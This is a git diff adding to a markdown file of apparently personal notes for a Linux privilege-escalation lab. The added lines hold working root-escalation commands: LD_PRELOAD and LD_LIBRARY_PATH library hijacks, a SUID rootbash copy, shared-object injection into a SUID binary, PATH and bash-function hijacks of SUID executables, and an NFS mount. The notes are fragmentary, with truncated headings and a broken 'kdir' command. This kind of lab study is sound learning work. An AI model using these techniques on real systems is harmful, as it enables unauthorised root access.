@@ -178,8 +178,59 @@ root:Z.5x9gGZx7J7U:0:0:root:/root:/bin/bash
 
  
 ```
-###LD_PRELOAD
+### LD_PRELOAD
+```
+/home/kali/priv/linux/tools/sudo/preload.c
+
+```
 ![image](https://user-images.githubusercontent.com/9059079/120900722-687b1e00-c604-11eb-9020-8b1b9e5b59c1.png)
 
+```
+/home/kali/priv/linux/tools/sudo/library_path.c
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+```
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+/tmp/rootbash -p
+```
+![image](https://user-images.githubusercontent.com/9059079/120907045-51e8bd00-c62c-11eb-85bd-c01fd4fdc4ba.png)
+### Note that the tar command is being run with a wildcard (*) in your home directory.
+![image](https://user-images.githubusercontent.com/9059079/120907077-b3a92700-c62c-11eb-80c9-b2d894c3684b.png)
+
+![image](https://user-images.githubusercontent.com/9059079/120907091-cb80ab00-c62c-11eb-9b24-ec9a83439104.png)
+```
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 
 
+```
+
+### The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection
+```
+/home/kali/priv/linux/tools/suid/libcalc.c
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
+```
+![image](https://user-images.githubusercontent.com/9059079/120907159-4944b680-c62d-11eb-8490-1ab5b6b7b339.png)
+
+### SUID / SGID Executables - Environment Variables
+```
+gcc -o service /home/user/tools/suid/service.c
+
+strings /usr/local/bin/suid-env
+PATH=.:$PATH /usr/local/bin/suid-env
+```
+### /bin/bash --version In Bash versions <4.2-048 i
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+```
+kdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+```
+
+```
+![image](https://user-images.githubusercontent.com/9059079/120907301-52825300-c62e-11eb-8807-4cdb22c86d89.png)
